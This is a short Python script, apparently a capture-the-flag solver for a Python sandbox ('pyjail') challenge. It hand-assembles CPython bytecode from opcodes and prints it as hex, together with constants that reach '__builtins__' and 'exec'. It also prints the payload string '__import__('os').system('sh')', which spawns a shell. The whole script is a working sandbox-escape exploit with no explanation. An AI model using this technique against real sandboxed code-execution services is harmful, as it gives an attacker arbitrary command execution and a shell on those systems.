from opcode import opmap
import dis

code = b""

code += bytes([opmap["LOAD_CONST"], 0])
code += bytes([opmap["GET_LEN"], 0])
code += bytes([opmap["IMPORT_FROM"], 0])
code += bytes([opmap["ROT_TWO"], 0])
code += bytes([opmap["CALL_FUNCTION"], 1])
code += bytes([opmap["MATCH_MAPPING"], 0])
code += bytes([opmap["BINARY_SUBSCR"], 0])
code += bytes([opmap["IMPORT_FROM"], 1])
code += bytes([opmap["LOAD_CONST"], 0])
code += bytes([opmap["BINARY_SUBSCR"], 0])
code += bytes([opmap["LOAD_CONST"], 1])
code += bytes([opmap["BINARY_SUBSCR"], 0])
code += bytes([opmap["LOAD_CONST"], 2])
code += bytes([opmap["CALL_FUNCTION"], 1])
code += bytes([opmap["RETURN_VALUE"], 0])
# print(len(code))

print("__builtins__,exec,__import__('os').system('sh')")
print("__reduce_ex__,__globals__")
print(code.hex())
print()
